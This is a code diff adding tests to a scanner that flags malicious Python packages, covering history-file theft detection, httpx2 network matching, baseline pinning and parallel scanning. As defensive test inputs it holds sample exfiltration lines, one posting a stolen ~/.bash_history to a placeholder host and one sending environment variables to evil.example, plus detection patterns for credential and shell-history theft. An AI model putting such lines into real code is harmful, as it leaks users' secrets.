@@ -325,6 +325,44 @@ def test_proc_self_status_pattern_is_live():
     assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")
 
 
+def test_fs_enum_does_not_flag_the_word_history():
+    # `\bhistory\b.*\bread\b` under re.DOTALL spanned the whole file, so any module mentioning
+    # "history" before "read" was filesystem enumeration -- and a CRITICAL alongside a network
+    # call. That is how httpx, urllib3, IPython and torch got baselined.
+    for s in (
+        "history: list[Response] | None = None\n\ndef read(self): pass\n",
+        "from IPython.core.history import HistoryManager\n\ndef read(): pass\n",
+        "if retries is not None and retries.history:\n    resp.read()\n",
+        'if "history" in b:\n    b.read()\n',
+    ):
+        assert not sp.RE_FS_ENUM.search(s), s
+
+
+def test_fs_enum_still_flags_real_history_file_reads():
+    # The half that matters must fire. The old `\b\.bash_history\b` / `\b\.zsh_history\b` could
+    # never match ("~/.bash_history" puts \b between two non-word chars, the same unsatisfiable-\b
+    # bug as /proc/self/status above), so every form below was missed.
+    for s in (
+        'open(os.path.expanduser("~/.bash_history")).read()',
+        "p = Path.home() / '.zsh_history'",
+        'f = open("/root/.python_history")',
+        "open(os.path.expanduser('~/.history'))",
+        'hist = os.environ.get("HISTFILE")',
+    ):
+        assert sp.RE_FS_ENUM.search(s), s
+
+
+def test_history_theft_plus_network_is_critical():
+    payload = (
+        "import requests\n"
+        "data = open(os.path.expanduser('~/.bash_history')).read()\n"
+        "requests.post('http://x.invalid', data = data)\n"
+    )
+    findings = sp.check_py_file(payload, "pkg/_x.py", "pkg")
+    fs = [f for f in findings if "Enumerates filesystem" in f.check]
+    assert fs and fs[0].severity == sp.CRITICAL, findings
+
+
 def _mk(
     sev,
     pkg,
@@ -373,6 +411,65 @@ def test_baseline_key_line_shift_stable_but_code_specific():
         "Env: L417: env = os.environ.copy()\nNetwork: requests.post('https://evil.example/exfil', data=env)",
     )
     assert sp._finding_key(base) != sp._finding_key(malicious)
+
+
+def test_annotation_only_network_entries_are_digest_pinned():
+    """A baselined finding whose network evidence is only type annotations must pin the file.
+
+    RE_NETWORK matches ``httpx2.Client`` where it appears in a signature, but not a call
+    through an instance, so ``client.post(..., data=api_key)`` appended to one of these
+    files contributes no evidence: the evidence hash is unchanged and the entry would go
+    on suppressing it. Pinning the file digest is what makes any edit reopen the finding,
+    which is the property _load_baseline documents for exactly this shape.
+    """
+    import json
+    import pathlib
+
+    baseline = json.loads(
+        (
+            pathlib.Path(__file__).resolve().parents[2] / "scripts" / "scan_packages_baseline.json"
+        ).read_text(encoding = "utf-8")
+    )
+    credential_adjacent = {
+        "openai/_client.py",
+        "openai/lib/azure.py",
+        "openai/lib/bedrock.py",
+        "openai/auth/_workload.py",
+    }
+    seen = set()
+    for entry in baseline["entries"]:
+        if entry.get("package") == "openai" and entry.get("file") in credential_adjacent:
+            seen.add(entry["file"])
+            assert entry.get("file_sha256"), (
+                f"{entry['file']} is baselined on evidence that a later payload can leave "
+                f"unchanged; it has to pin the reviewed file digest"
+            )
+    assert seen == credential_adjacent, f"missing entries for {credential_adjacent - seen}"
+
+
+def test_network_check_sees_httpx2():
+    """httpx2 is a separate import name, not a submodule of httpx.
+
+    openai 3.0.0 requires httpx2 and routes every call through it. While the network
+    check matched only ``httpx.``, the SDK's own HTTP was invisible to each combined
+    check that needs a network half, so reading OPENAI_API_KEY next to an httpx2 call
+    did not register as secrets-plus-network at all.
+    """
+    for call in ("httpx2.get(u)", "httpx2.post(u)", "httpx2.Client()", "httpx2.AsyncClient()"):
+        assert sp.RE_NETWORK.search(call), call
+    # the original spelling still matches
+    for call in ("httpx.get(u)", "httpx.Client()"):
+        assert sp.RE_NETWORK.search(call), call
+    # and the widening stays anchored: no bare prefix or unrelated attribute
+    for miss in ("myhttpx.get(u)", "httpx23.get(u)", "httpx2.Timeout(5)"):
+        assert not sp.RE_NETWORK.search(miss), miss
+
+
+def test_httpx2_secrets_plus_network_is_one_finding():
+    """The combined check has to fire on a file that reads a secret and calls httpx2."""
+    src = 'import os, httpx2\nk = os.environ.get("OPENAI_API_KEY")\nhttpx2.Client().get(u)\n'
+    assert sp.RE_NETWORK.search(src)
+    assert sp.RE_ENV_HARVEST.search(src)
 
 
 def test_extract_evidence_records_all_matches():
@@ -1801,3 +1898,153 @@ def test_the_duplicate_check_sees_through_normalization(tmp_path):
     path = tmp_path / "baseline.json"
     path.write_text(json.dumps({"version": 1, "entries": entries}))
     assert len(sp._load_baseline(str(path))) == 1
+
+
+def test_the_pool_worker_returns_what_the_serial_call_returns():
+    """`_scan_one` is the only thing the pool runs, so it must be `scan_archive`.
+
+    It also swallows the archive-limit `[WARN]` lines and hands them back, so the
+    caller can print them in task order instead of whenever a worker happened to
+    reach them. Pin both halves: identical findings, and stderr captured rather
+    than leaked.
+    """
+    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
+        archive = str(FIXTURES / name)
+        captured, findings = sp._scan_one((archive, "fixture"))
+        assert findings == sp.scan_archive(archive, "fixture"), name
+        assert isinstance(captured, str), name
+
+
+def _oversized_member_wheel(path):
+    """A wheel whose declared member size trips the scanner's per-file cap.
+
+    Written rather than committed: the member is 70 MB of zeros, which deflates
+    to a few KB, so the archive on disk is small but `info.file_size` is well
+    over HARD_MAX_FILE_BYTES and `iter_archive_files` emits its `[WARN]` skip.
+    That warning is the thing `_scan_one` captures and the caller replays in
+    order, so without it in the corpus the stderr half of the comparison below
+    would be comparing two empty strings.
+    """
+    import zipfile
+
+    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
+        zf.writestr("pkg/huge.py", b"\0" * (sp.HARD_MAX_FILE_BYTES + 4096))
+        zf.writestr("pkg/__init__.py", "x = 1\n")
+    return path
+
+
+def test_scanning_in_parallel_finds_exactly_what_scanning_in_series_finds(
+    tmp_path, monkeypatch, capsys
+):
+    """The whole safety argument for the pool is that it changes nothing.
+
+    Drives `main()` over the same corpus at `--jobs 1` (serial branch) and
+    `--jobs 4` (pool branch) and demands byte-identical stdout and stderr.
+    `download_packages` is stubbed because the parallel loop sits behind it and
+    the real one needs PyPI.
+
+    The corpus is deliberately wide rather than the three committed fixtures:
+
+    - 24 archives, so completion order across 4 workers genuinely diverges from
+      submission order. `imap(chunksize=1)` yields in submission order, so this
+      is what makes the ordering claim real -- with only three instant archives
+      `imap_unordered` returns them in order anyway and the check proves nothing.
+    - one archive that trips the per-file size cap, so there is a `[WARN]` line
+      on stderr to compare. Otherwise the stderr assertion compares "" to "".
+    """
+    import shutil
+
+    def run(jobs):
+        # main() deletes each archive once scanned, so each arm gets its own copies.
+        stage = tmp_path / f"stage{jobs}"
+        stage.mkdir()
+        copies = []
+        for i in range(24):
+            src = ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz")[i % 3]
+            dest = stage / f"pkg{i:02d}-{src}"
+            shutil.copy(FIXTURES / src, dest)
+            copies.append((f"pkg{i:02d}", str(dest)))
+        copies.append(("oversized", str(_oversized_member_wheel(stage / "oversized.whl"))))
+
+        monkeypatch.setattr(sp, "download_packages", lambda *a, **k: (copies, []))
+        monkeypatch.setattr(
+            sys,
+            "argv",
+            ["scan_packages.py", "--no-baseline", "--jobs", str(jobs)]
+            + [name for name, _ in copies],
+        )
+        capsys.readouterr()
+        rc = sp.main()
+        captured = capsys.readouterr()
+        return rc, captured.out, captured.err
+
+    rc_serial, out_serial, err_serial = run(1)
+    rc_parallel, out_parallel, err_parallel = run(4)
+
+    # The pool branch prints one extra progress banner. That line is the only
+    # licensed difference; everything below it is the report and must match.
+    banner = re.compile(r"^  Scanning \d+ archive\(s\) across \d+ workers\.\.\.\n", re.M)
+    assert banner.search(out_parallel), "the pool branch did not run"
+    out_parallel = banner.sub("", out_parallel)
+
+    assert out_serial == out_parallel, "parallel scan reported different findings"
+    assert err_serial == err_parallel, "parallel scan reported different warnings"
+    assert rc_serial == rc_parallel
+    # Guard against either half being trivially empty.
+    assert "CRITICAL" in out_serial
+    assert "[WARN]" in err_serial
+
+
+def test_a_stalled_pool_exits_2_not_1(tmp_path, monkeypatch, capsys):
+    """A dead worker is an incomplete scan, and incomplete scans exit 2.
+
+    Exit 1 already means "non-baselined CRITICAL or HIGH findings detected", so a
+    stall that exits 1 reports an infrastructure failure as a detected threat, and
+    skips the SCAN INCOMPLETE report that tells the operator coverage was lost.
+
+    The first version of the pool raised `SystemExit(<message>)`, which does exactly
+    that: CPython prints a non-integer SystemExit value and exits 1.
+    """
+    import shutil
+
+    stage = tmp_path / "archives"
+    stage.mkdir()
+    copies = []
+    for i, name in enumerate(("malicious_wheel.whl", "clean_wheel.whl")):
+        dest = stage / f"pkg{i}-{name}"
+        shutil.copy(FIXTURES / name, dest)
+        copies.append((f"pkg{i}", str(dest)))
+
+    monkeypatch.setattr(sp, "download_packages", lambda *a, **k: (copies, []))
+
+    class _StalledResults:
+        def next(self, timeout = None):
+            raise sp.multiprocessing.TimeoutError()
+
+    class _StalledPool:
+        def __enter__(self):
+            return self
+
+        def __exit__(self, *exc):
+            return False
+
+        def imap(self, *a, **k):
+            return _StalledResults()
+
+    monkeypatch.setattr(
+        sp.multiprocessing,
+        "get_context",
+        lambda _method: type("C", (), {"Pool": lambda _s, processes = None: _StalledPool()})(),
+    )
+    monkeypatch.setattr(
+        sys,
+        "argv",
+        ["scan_packages.py", "--no-baseline", "--jobs", "4", "pkg0", "pkg1"],
+    )
+
+    rc = sp.main()
+    captured = capsys.readouterr()
+
+    assert rc == 2, f"a stalled scan must exit 2 (incomplete), got {rc}"
+    assert "SCAN INCOMPLETE" in captured.err
+    assert "scan stalled" in captured.err
